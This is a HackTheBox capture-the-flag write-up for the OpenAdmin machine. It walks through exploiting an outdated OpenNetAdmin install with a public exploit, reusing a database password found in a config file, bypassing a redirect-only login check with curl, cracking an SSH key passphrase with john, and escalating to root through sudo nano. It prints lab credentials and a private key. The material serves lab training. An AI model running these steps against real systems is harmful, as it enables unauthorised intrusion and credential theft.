---
title: OpenAdmin &#8211; HackTheBox WriteUp
author: yakuhito
layout: post
permalink: openadmin-htb-writeup
image: /images/openadmin-htb-writeup/openadmin-htb-writeup.jpeg
category: htb
---

## Summary

OpenAdmin just retired today. I had lots of fun solving it and I learned that nano can be abused for privesc (just like vim). Its IP address is '10.10.10.171' and I added it to '/etc/hosts' as 'openadmin.htb'. Without further ado, let's jump right in!

## Scanning and Shell as www-data

A basic nmap scan was enough to get me started:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/openadmin# nmap -sV -oN scan.txt openadmin.htb
# Nmap 7.80 scan initiated Wed Mar 18 12:14:26 2020 as: nmap -sV -oN scan.txt openadmin.htb
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 18 12:14:52 2020 -- 1 IP address (1 host up) scanned in 25.96 seconds
root@fury-battlestation:~/htb/blog/openadmin#

{% endhighlight %}

Port 80 hosted the default Apache page:

<center><img src="/images/openadmin-htb-writeup/0.png"></center>

As there were no more ports open (except 22 - which I couldn't see a way to exploit), I ran dirb on the site:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/openadmin# dirb http://openadmin.htb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar 18 12:12:18 2020
URL_BASE: http://openadmin.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://openadmin.htb/ ----
==> DIRECTORY: http://openadmin.htb/artwork/                                                     
+ http://openadmin.htb/index.html (CODE:200|SIZE:10918)                                          
==> DIRECTORY: http://openadmin.htb/music/                                                       
+ http://openadmin.htb/server-status (CODE:403|SIZE:278)                                         
                                                                                                 
---- Entering directory: http://openadmin.htb/artwork/ ----
==> DIRECTORY: http://openadmin.htb/artwork/css/                                                 
==> DIRECTORY: http://openadmin.htb/artwork/fonts/                                               
==> DIRECTORY: http://openadmin.htb/artwork/images/                                              
+ http://openadmin.htb/artwork/index.html (CODE:200|SIZE:14461)                                  
^C> Testing: http://openadmin.htb/artwork/jennifer                                               
root@fury-battlestation:~/htb/blog/openadmin# 
{% endhighlight %}

Dirb found multiple folders, but the most intresting ones are /artwork/ and /music/:

<center><img src="/images/openadmin-htb-writeup/1.png"></center>
<center><img src="/images/openadmin-htb-writeup/2.png"></center>

By clicking 'login' on the /music/ page, I got redirected to /ona:

<center><img src="/images/openadmin-htb-writeup/3.png"></center>

As even the app complained the version is outdated, I started searching for exploits online and found [this one](https://www.exploit-db.com/exploits/47691). I downloaded it, converted it to a unix file (it contained \r characters) and then ran it against the /ova/ directory:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/openadmin# wget https://www.exploit-db.com/raw/47691 -O exploit.sh
--2020-03-18 12:34:20--  https://www.exploit-db.com/raw/47691
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 779 [text/plain]
Saving to: ‘exploit.sh’

exploit.sh               100%[================================>]     779  --.-KB/s    in 0s      

2020-03-18 12:34:20 (2.68 MB/s) - ‘exploit.sh’ saved [779/779]

root@fury-battlestation:~/htb/blog/openadmin# dos2unix ./exploit.sh 
dos2unix: converting file ./exploit.sh to Unix format...
root@fury-battlestation:~/htb/blog/openadmin# chmod +x exploit.sh 
root@fury-battlestation:~/htb/blog/openadmin# ./exploit.sh http://openadmin.htb/ona/
$ whoami
www-data
$ 

{% endhighlight %}

That was easy, wasn't it? :)

## Getting user.txt

After getting a shell, I found mysef in ova's http directory:

{% highlight bash %}
$ ls -l
total 60
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r-- 1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r-- 1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x 9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r-- 1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r-- 1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r-- 1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 workspace_plugins
$ pwd
/opt/ona/www
$
{% endhighlight %}

After a bit of playing around, I found the database password in a config file:

{% highlight bash %}

$ cd ./local/config; pwd; cat ./database_settings.inc.php
/opt/ona/www/local/config
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

$

{% endhighlight %}

The password din't look random, so I enumerated the users of the box and tried to log in as them using it:

{% highlight bash %}
$ ls /home
jimmy
joanna
$ 
{% endhighlight %}

The password worked for jimmy:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/openadmin# ssh jimmy@openadmin.htb
jimmy@openadmin.htb\'s password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 18 16:54:49 UTC 2020

  System load:  1.63              Processes:             129
  Usage of /:   49.6% of 7.81GB   Users logged in:       1
  Memory usage: 19%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ ls
jimmy@openadmin:~$
{% endhighlight %}

However, there was no user proof in jimmy's home directory. This made me believe that the user proof was located in joanna's.
After some basic enumeration, I discovered an interesting folder in /var/www:

{% highlight bash %}
jimmy@openadmin:/var/www$ cd internal/
jimmy@openadmin:/var/www/internal$ l
index.php*  logout.php*  main.php*
jimmy@openadmin:/var/www/internal$
{% endhighlight %}

The 'main.php' file seemed to print joanna's id_rsa file if the user was logged in:

{% highlight php %}
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
{% endhighlight %}

The code that handled authentication was located in index.php. As the file was a little bit long, I will only paste the snippet that allowed me to move further:

{% highlight php %}
<?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
{% endhighlight %}

The web app only authenticated the user if the username was jimmy and the given password hashed to a hard-coded string. A quick visit to [CrackStation](https://crackstation.net/) revealed that the password was... Revealed.
The site was not exposed externally (and was hosted inside a folder called 'internal'), so it was most probably running on a local port. A quick 'netstat' command revealed all open local ports:

{% highlight bash %}
jimmy@openadmin:/var/www/internal$ netstat -na | grep -i LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9876            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9877            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
unix  2      [ ACC ]     STREAM     LISTENING     16644    /var/run/dbus/system_bus_socket
[...]
jimmy@openadmin:/var/www/internal$
{% endhighlight %}

There are only a few possible ports, so I used curl to test each of them individually. Port 52846 worked:

{% highlight bash %}
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php --output -
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
jimmy@openadmin:/var/www/internal$
{% endhighlight %}

I saved the key to ~/.ssh/openadmin_user and used it to connect as joanna:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/openadmin# ssh joanna@openadmin.htb -i ~/.ssh/openadmin_user 
Enter passphrase for key '/root/.ssh/openadmin_user': 

root@fury-battlestation:~/htb/blog/openadmin#

{% endhighlight %}

The key is password-protected, so I used john to crack the passphrase and then removed it from the key:

{% highlight bash %}
/usr/share/john/ssh2john.py
root@fury-battlestation:~/htb/blog/openadmin# /usr/share/john/ssh2john.py ~/.ssh/openadmin_user > crackme
root@fury-battlestation:~/htb/blog/openadmin# john --wordlist=/usr/share/wordlists/rockyou.txt crackme
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (/root/.ssh/openadmin_user)
1g 0:00:00:07 DONE (2020-03-18 13:14) 0.1410g/s 2022Kp/s 2022Kc/s 2022KC/sa6_123..*7¡Vamos!
Session completed
root@fury-battlestation:~/htb/blog/openadmin# ssh-keygen -p -P bloodninjas -N '' -f ~/.ssh/openadmin_user
Your identification has been saved with the new passphrase.
root@fury-battlestation:~/htb/blog/openadmin#
{% endhighlight %}

I was then able to use the key to log in as joanna:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/openadmin# ssh joanna@openadmin.htb -i ~/.ssh/openadmin_user 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ wc user.txt 
 1  1 33 user.txt
joanna@openadmin:~$
{% endhighlight %}

The user proof starts with ‘c9’ 😉

## Wait... what?!

Loog again at the curl command:

{% highlight bash %}
curl http://127.0.0.1:52846/main.php --output -
{% endhighlight %}

Does it look like I provided the authentication data? No, I didn't. The reason is simple: the authentication mechanism in main.php is flawed:

{% highlight php %}
session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
{% endhighlight %}

The above script just adds a redirection header; it does not stop the execution of the rest of the page. As cURL ignores redirection headers by default, I bypassed the authentication system (AWAE, here I come!).

## Exploiting nano

After I submitted the use proof, I began enumeating the box again. I found out that joanna could run nano as root without providing a password:

{% highlight bash %}
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$
{% endhighlight %}

I have never exploited nano for privesc, but lucky for me [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) had an entry that showed the process step-by-step.
I won't post any snippet here, as that method kind of plays with your terminal display (do it and you'll se what I'm talking about).

The root proof starts with ‘2f’ 😉

If you liked this post and want to support me, please [follow me on Twitter](https://twitter.com/yakuhito) 🙂

Until next time, hack the world.

yakuhito, over.


